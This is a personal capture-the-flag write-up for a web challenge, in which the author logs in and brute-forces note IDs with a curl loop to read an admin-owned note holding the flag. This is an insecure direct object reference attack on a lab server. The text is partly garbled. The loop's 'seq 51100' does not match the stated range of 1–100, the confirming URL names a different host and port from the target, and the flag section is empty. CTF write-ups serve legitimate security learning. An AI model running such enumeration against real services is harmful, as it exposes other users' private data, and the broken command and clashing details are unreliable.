# FinalCTF-Poros — Web Exploitation Writeup

Personal CTF writeup for the POROS Final CTF Stage.

---

## Web Exploitation

### [493 pts] He Made a Statement
**Author:** zenc

#### Overview
Upon opening the login page at `10.34.9.91:7001`, credentials were provided:
- **Username:** `user`
- **Password:** `userpass`

After logging in, the dashboard displayed all notes with their IDs — but not every ID was shown (e.g., 2, 3, 5, 7, 8, etc.).

#### Approach

One note (ID 41) stood out — it was owned by `admin` and contained a fake flag.

To enumerate all notes, I iterated through IDs 1–100 using the following bash command:

```bash
for i in $(seq 51100); do
  result=$(curl -s -b cookies.txt "http://10.34.9.91:7001/note.php?id=$i")
  owner=$(echo "$result" | grep -o "Owner: [^<]*")
  note=$(echo "$result" | grep -o 'class="note">[^<]*' | cut -d'>' -f2)
  if [ -n "$note" ]; then
    echo "ID $i | $owner | $note"
  fi
done
```

#### Result

Found **ID 67** — owned by `admin`, with the flag as its note content.

Navigating directly to `http://54.252.114.9:8080/note.php?id=67` confirmed it.

#### Flag
